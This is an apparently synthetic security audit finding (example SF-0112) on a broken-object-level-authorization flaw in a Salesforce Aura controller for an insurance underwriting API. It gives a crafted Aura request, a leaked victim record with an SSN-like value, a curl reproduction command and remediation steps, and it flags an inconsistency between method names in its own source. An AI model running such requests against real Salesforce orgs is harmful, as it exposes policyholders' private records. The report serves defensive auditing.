# Security Analysis Report
**System:** ClaimsFlow Underwriting API (Salesforce-Integrated)
**Domain:** Insurance / Underwriting
**Example ID:** SF-0112
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 10.2 | Parameter escalation on `ContactController.updateContact` — attacker reads insurance underwriting Contact records outside their session scope |

---

## Finding 1 — BOLA: Parameter Escalation on Contact Object (Pattern 10.2)

### Summary
The Apex controller `ContactController` on ClaimsFlow Underwriting API (`df9be5cf.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contact object. Per §5.0 Pattern 10.2, the attacker escalates their session scope by substituting `contactId` to read any victim's Contact record. In insurance/underwriting, Contact records may contain policyholder PII, medical underwriting notes, and claims history.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContactDetails(String contactId, ...)` while the Aura descriptor in §6.0 is `c.ContactController.updateContact`. These names conflict (read vs. update). The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 10.2 — Parameter escalation (own session scope extension)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://df9be5cf.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://df9be5cf.lightning.force.com/aura
Authorization: Bearer 00DDF9BE5CF!ARdf9be5cf...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DDF9BE5CF!ARdf9be5cf...

message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN",
"params":{"contactId":"001E5CF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contact Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001E5CF", "Name": "Victim Contact Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-81-4456"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DDF9BE5CF!ARdf9be5cf..."
curl -s -X POST "https://df9be5cf.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001E5CF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-81-4456
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContactController { ... }`
2. `WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. `updateContact` should perform write operations only — do not allow read pivots via field selection parameter.
